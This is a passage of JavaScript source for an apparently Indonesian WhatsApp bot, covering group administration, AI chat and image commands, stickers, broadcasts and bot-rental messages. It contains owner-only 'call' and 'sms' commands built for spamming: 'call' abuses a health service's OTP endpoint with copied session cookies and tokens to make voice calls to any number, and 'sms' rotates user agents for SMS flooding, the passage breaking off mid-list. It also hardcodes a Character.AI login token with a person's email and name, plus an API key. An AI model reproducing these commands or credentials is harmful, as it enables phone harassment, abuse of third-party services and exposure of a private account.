                  var lenwyai = await fetchJson(`https://aemt.me/openai?text=${q}`)
                  var lenai = lenwyai.result
                 await reply(lenai)
               }
               break

case "aimage":
try {
if (global.keyopenai === '') return reply("❄️️ Kayaknya Ada Error Di Apikey Nih");
if (!q) return reply(`❄️️ *Contoh : ${prefix + command} Man With Knife*`)
reply('❄️️ *Sabar Yaa*')
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
lenwy.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
reply("❄️️ *Ada Error Nih :*"+ error.message);
}
break

case 'lirik': {
if (!isOwner) return reply(mess.error)
if (!args[0]) return reply("Judulnya?")
let d = await fetchJson(`https://vihangayt.me/search/lyrics?q=${args[0]}`)
lenwy.sendMessage(m.chat, { text: d.data.lyrics }, { quoted: len })
}
break

case 'cai2443417': {
if (!isCreator) return reply(mess.owner)
if (!text) reply `Contoh : ${prefix + command} Halo`
await cai(`${args[0]}`)
let res = await axios.get(`https://vihangayt.me/tools/characterai?q=${encodeURIComponent(text)}`)
lenwy.sendMessage(m.chat, { text: res.data.cnt }, {quoted:m})
const CharacterAI = require("node_characterai");
const characterAI = new CharacterAI()
characterAI.puppeteerPath = "/usr/bin/chromium-browser";
  token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkVqYmxXUlVCWERJX0dDOTJCa2N1YyJ9.eyJnaXZlbl9uYW1lIjoiUkNTIiwiZmFtaWx5X25hbWUiOiJYWiIsIm5pY2tuYW1lIjoicmNzeHo2NDkiLCJuYW1lIjoiUkNTIFhaIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0lYbGpRdW11SWlQTjdwLUoxUk1HNjZ0ODZzTzJhMG9DcW93RTlZVDFzaj1zOTYtYyIsImxvY2FsZSI6ImlkIiwidXBkYXRlZF9hdCI6IjIwMjMtMTEtMDVUMTQ6NTM6NDkuNjM0WiIsImVtYWlsIjoicmNzeHo2NDlAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImlzcyI6Imh0dHBzOi8vY2hhcmFjdGVyLWFpLnVzLmF1dGgwLmNvbS8iLCJhdWQiOiJkeUQzZ0UyODFNcWdJU0c3RnVJWFloTDJXRWtucVp6diIsImlhdCI6MTY5OTE5NjAzNCwiZXhwIjoxNzAyNzk2MDM0LCJzdWIiOiJnb29nbGUtb2F1dGgyfDExMDY5MjA2MTkzMTI0MTU4NTgwNSIsInNpZCI6IjVhaklfSlRJeFBZWGpzU0piWmdzRnQ4MXhaTHRhRERyIiwibm9uY2UiOiJUQzE0V2xvMVNGSmlkVU5FWVVSbFJXb3dTV3RJU25acVRtVTRVR3hoUldReU0xQm5Rbk0yYjAwNWJ3PT0ifQ.jduu283Aycw7GwUL270EkwoF71bINRrLnFzVJGpoG9uOO4A-jxtZ07XRZIr_t4lT_gt2N19BWXg7SGxRR_coFbCJLfyUHLzxx6ZaDGMqUnCPhJ6WXBHABsTsqnlQIJs1sQPJyLKw01-FU5FoB8atW3OIyjt0nJayJtMSm4NzKkGR2gBWZSNR3FIqX7r4NY_wUSc-1Za50FaMiLg3XdGkfE59wxs_NdlxxdPVVG4G4uKBWQCIy6ofRDnnb22Wfw1knt8yXMjGfq8RtSsAkGMmjp_KVICSRDCqy0cCOtUdmih5LCRyEQagIRBl90SP753C7ehiue_ucidCYh9XrxP7HQ";
  await characterAI.authenticateWithToken(token)
  characterId = "kZ3_qgkyiYvcRqgwv1WE2WQeME9CZy1yrCnMx98wyfk";
  const chat = await characterAI.createOrContinueChat(characterId)
  const response = await chat.sendAndAwaitResponse(`${encodeURIComponent(text)}`, true)
  lenwy.sendMessage(m.chat, { text: response.text }, {quoted:m})
  }
break

case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
let response = await lenwy.groupInviteCode(from)
lenwy.sendText(from, `❄️️ *Name Group : ${groupMetadata.subject}*\n\n🎁 *Link Group : https://chat.whatsapp.com/${response}*`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
lenwy.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!isCreator) return reply('*Khusus Premium*')
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283829102407`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await lenwy.groupInviteCode(from)
lenwy.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, len, { detectLink: true })

}
break

case '🚶🏻‍♂️':
case 'kick': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lenwy.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return reply('*Khusus Premium*')
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lenwy.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lenwy.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lenwy.groupParticipantsUpdate(from, [botNumber], 'demote')
}
break

case 'hidetag': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
lenwy.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:len})
}
break

case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'attp':
if (isBan) return reply('*Lu Di Ban Owner*')
if (args.length == 0) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya 汉*`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
lenwy.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'grup':
case 'group': {   
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
if (args[0] === 'close'){
await lenwy.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group 🫡`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await lenwy.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group 🫡`)).catch((err) => reply(jsonformat(err)))
} else {
lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `❄️️ *Silahkan Ketik*
Group open
Group close`}, {quoted:m}) 
 }
}
break

case 'editinfo': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
 if (args[0] === 'open'){
await lenwy.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group 🫡`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await lenwy.groupSettingUpdate(from, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group 🫡`)).catch((err) => reply(jsonformat(err)))
 } else {
 lenwy.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break

case 'join': {
if (!isCreator) return reply('*Khusus Premium*')
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid! 🤔'
reply('❄️️ *Sabar Yaa*')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await lenwy.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'leave': {
                if (!isOwner) return reply(mess.owner)
                reply("Selamat Tinggal 😥")
                await lenwy.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
        }
        break

case 'editsubjek': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
if (!text) throw 'Text nya ?'
await lenwy.groupUpdateSubject(from, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break
    case 'delgc':

  if (!isOwner) return reply(`khusus Creator`)

    if (!isGroup) return reply(`Khusus Group`)

var ini = pler.indexOf(m.chat)

pler.splice(ini, 1)

fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))

reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini`)

break

       case 'addgc':

    if (!isGroup) return reply(`Khusus Group`)         

if (!isOwner) return reply(`Khusus Creator`)

pler.push(m.chat)

fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))

reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini`)

           break

case 'editdesk':{
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
if (!text) throw 'Text Nya ?'
await lenwy.groupUpdateDescription(from, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
let teks = `❄️️ *Tag All*
🎁 *Pesan : ${q ? q : 'Kosong'}*\n\n`
for (let mem of participants) {
teks += `⨠ @${mem.id.split('@')[0]}\n`
}
lenwy.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break

case'demoteall2443417':
if (!isCreator) return reply('*Khusus Premium*')
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
LenwyLD()
var groupe = await lenwy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
lenwy.groupParticipantsUpdate(from, mems, 'demote')
break

case'promoteall2443417':
if (!isCreator) return reply('*Khusus Premium*')
if (!m.isGroup) return reply('Ini Fitur Grup 😔')
if (!isBotAdmins) return reply('Bot Bukan Admin 😔')
if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
LenwyLD()
var groupe = await lenwy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
lenwy.groupParticipantsUpdate(from, mems, 'promote')
break

case 'tutor2443417':
case 'tutorial2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
 reply(`👋🏻 Haii Kak ${pushname}, Selamat ${salam}
Tutorial Run Via Panel
https://youtube.com/@lenwy`)
}
break

case 'sewa':
if (isBan) return reply('*Lu Di Ban Owner*')
reply(`❄️️ *Harga Sewa Bot ©Project Kamiya汉 V3*

🍁 *1 Minggu = 5k*
🍁 *1 Bulan = 10k*

🎁 *Chat : wa.me/6283829102407*`)
break

case 'sewabot':
if (isBan) return reply('*Lu Di Ban Owner*')
if (!isCreator) return reply('*Khusus Premium*')
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
let cret = await lenwy.groupCreate(args.join(" "), [])
let response = await lenwy.groupInviteCode(cret.id)
lenwy.sendMessage(m.chat, { text: `❄️️ *Create Group Sewa Bot*

❄️️ *Sewa Bot Selama ${text} Telah Di Proses, Silahkan Masuk Group Melalui Link Yang Sudah Di Sediakan*

❄️️ *Bot : ${botname}*
❄️️ *Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}*
`, m})
reply('🎁 *Link Group Khusus Berhasil Dikirim Melalui Chat Pribadi Anda*')
break

case 'stiker': case 'sticker': case 's': case 'stickers': case 'sgif': {
if (isBan) return reply('*Kamu Di Ban Owner*')
 if (!quoted) reply `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
reply('❄️️ *Sabar Yaa*')
let media = await quoted.download()
let encmedia = await lenwy.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await lenwy.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'inspect': {
if (isBan) return reply('*Lu Di Ban Owner*')
LenwyLD()
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid 🤔")
lenwy.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `❄️️ *Group Link Yang Di Inspect*

⨠ *Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}*
⨠ *Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}*
⨠ *Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}*
⨠ *Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}*
⨠ *Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member*

*⨠ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}*
🎁 *By ${botname}*`
try {
pp = await lenwy.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
lenwy.sendFile(from, pp, "", m, { caption: tekse, mentions: await lenwy.parseMention(tekse) })

})
}
break

case 'ping':
case 'botstatus':
case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, {
length
}) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
❄️️ Kecepatan Respon :*${latensi.toFixed(4)} _Second_* \n *${oldd - neww} _miliseconds_*\n\n⨠ *Runtime* : ${runtime(process.uptime())}

💻 *Info Server*
⨠ *RAM* : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

${cpus[0] ? `💻 *Total Cpu Usage*\n⨠ ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
⨠ CPU Core(s) Usage (${cpus.length} Core CPU)` : ''}
`.trim()
await lenwy.sendMessage(m.chat, {
text: respon,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: 'Kecepatan Bot',
body: `${latensi.toFixed(4)} Second`,
thumbnailUrl: 'https://telegra.ph/file/24f30f85f768682d31915.jpg',
sourceUrl: global.link,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: len
})
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply('*Khusus Premium*')
LenwyLD()
if (!text) reply `❄️️ *Contoh : ${prefix + command} Subscribe Kamiya*`
let getGroups = await lenwy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
for (let i of anu) {
await sleep(1500)
lenwy.sendMessage(i, {text: `${text}`}, {quoted:len})
    }
reply(`❄️️ Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'bcimg': case 'bcvid': case 'bcvideo': case 'share': {
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
if (m.isGroup) return reply(mess.private)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group`)
reply(mess.wait)
let getGroups = await lenwy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
global.teksjpm = text
for (let xnxx of anu) {
let metadat72 = await lenwy.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await lenwy.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await lenwy.sendMessage(xnxx, { image: { url: mem }, caption: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: len })
await sleep(2000)
} else {
if(/video/.test(mime)){
media1 = await lenwy.downloadAndSaveMediaMessage(quoted)
mem1 = await uptotelegra(media1)
await lenwy.sendMessage(xnxx, { video: { url: mem1 }, caption: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: len })
await sleep(2000)
} else {
await lenwy.sendMessage(xnxx, { text: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: len })
await sleep(2000)
}}
}
}
break


case 'welcome':
            case 'left': {
               if (!isAdmins && !isCreator) return reply(mess.admin)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].notification.status = true
                  reply(`${command} is enable`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].notification.status = false
                  reply(`${command} is disable`)
               }
            }
            break
            case 'settextwelcome':
            case 'setwelcome':{
               if (!isAdmins && !isCreator) return reply(mess.admin)
               if (args.length < 1) return reply('teksnya?')
               db.data.chats[from].notification.status.text_welcome = args[0]
               reply(mess.success)
            }
            break 
            case 'settextleft':
            case 'setleft':{
               if (!isAdmins && !isCreator) return reply(mess.admin)
               if (args.length < 1) return reply('textnya?')
               db.data.chats[from].notification.status.text_left = args[0]
               reply(mess.success)
            }
            break 
*/
case 'nsfw': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].nsfw) return reply(`Sudah Aktif Sebelumnya 😳`)
                    db.data.chats[m.chat].nsfw = true
                    reply(`Nsfw Group WhatsApp Aktif 😳`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].nsfw) return reply(`Sudah Nonaktif Sebelumnya 🤐`)
                    db.data.chats[m.chat].nsfw = false
                    reply(`Nsfw Group WhatsApp Nonaktif 🤐`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'antitoxic': {
                if (!isCreator) return reply(`KHUSUS OWNER`)
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antitoxic) return reply(`Sudah Aktif Sebelumnya 🤐`)
                    db.data.chats[m.chat].antitoxic = true
                    reply(`Antitoxic Group WhatsApp Aktif 🤐`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antitoxic) return reply(`Sudah Nonaktif Sebelumnya 🤬`)
                    db.data.chats[m.chat].antitoxic = false
                    reply(`Antitoxic Group WhatsApp Nonaktif 🤬`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'autodown': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].autodown) return reply(`Sudah Aktif Sebelumnya 🤯`)
                    db.data.chats[m.chat].autodown = true
                    reply(`Auto Download Aktif 🤯\n\n- TikTok\n- YouTube\n- Instagram\n- Mediafire`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].autodown) return reply(`Sudah Nonaktif Sebelumnya 😤`)
                    db.data.chats[m.chat].autodown = false
                    reply(`Auto Download Nonaktif 😤`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
case 'antilinkv1': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilink) return reply(`Sudah Aktif Sebelumnya 😤`)
                    db.data.chats[m.chat].antilink = true
                    reply(`Antilink Group WhatsApp Aktif 😤`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilink) return reply(`Sudah Nonaktif Sebelumnya 😣`)
                    db.data.chats[m.chat].antilink = false
                    reply(`Antilink Group WhatsApp Nonaktif 😣`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'antilink':
                if (!isAdmins) return reply('Kamu Bukan Admin Grup 🤔')
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args.length < 1) return reply(`❄️️ *Contoh ${prefix + command} on/off*`)
                if (q == 'on'){
                    global.db.data.chats[m.chat].antilinkv2 = true
                    reply(`❄️ *Berhasil Mengaktifkan Antilink*`)
                } else if (q == 'off'){
                    global.db.data.chats[m.chat].antilinkv2 = false
                    reply(`❄️️ *Berhasil Mematikan Antilink*`)
                }
            break

case 'antipanel':
case 'antipnl': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antipanel) return reply(`Sudah Aktif Sebelumnya 😝`)
                    db.data.chats[m.chat].antipanel = true
                    reply(`Anti Promosi Panel Aktif 😝`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antipanel) return reply(`Sudah Nonaktif Sebelumnya 🤔`)
                    db.data.chats[m.chat].antipanel = false
                    reply(`Anti Promosi Panel Nonaktif 🤔`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break

case 'autoread':
            if (!isCreator) return reply(mess.owner)
            if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
            if (q === 'on'){
            global.db.data.settings[botNumber].autoread = true
            reply(`Berhasil mengubah autoread ke ${q}`)
            } else if (q === 'off'){
            global.db.data.settings[botNumber].autoread = false
            reply(`Berhasil mengubah autoread ke ${q}`)
            }
        break
        
case 'kobo2443417': {
if (!isCreator) return reply('*Khusus Premium*')
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (ChatBot) return reply('Sudah Aktif')
chatbot.push(from)
reply('Succes menyalakan kobo di group ini 🌷')
} else if (args[0] === "off") {
if (!ChatBot) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
chatbot.splice(off, 1)
reply('Succes mematikan kobo di group ini 🌷')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case '6662443417': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args.length < 1) return
if (args[0] === "on") {
if (autodelete) return
antidel.push(from)
reply('Succes menyalakan 666 di group ini ☠️')
} else if (args[0] === "off") {
if (!autodelete) return
let off = antidel.indexOf(from)
antidel.splice(off, 1)
reply('Succes mematikan 666 di group ini ☠️')
} else {
}
}
break

case "call":
if (!isCreator) return reply('*Khusus Owner*')
LenwyLD()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6283829102407`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+6283829814737`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

case 'sms': {
if (!isCreator) return reply('*Khusus Owner*')
LenwyLD()
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) 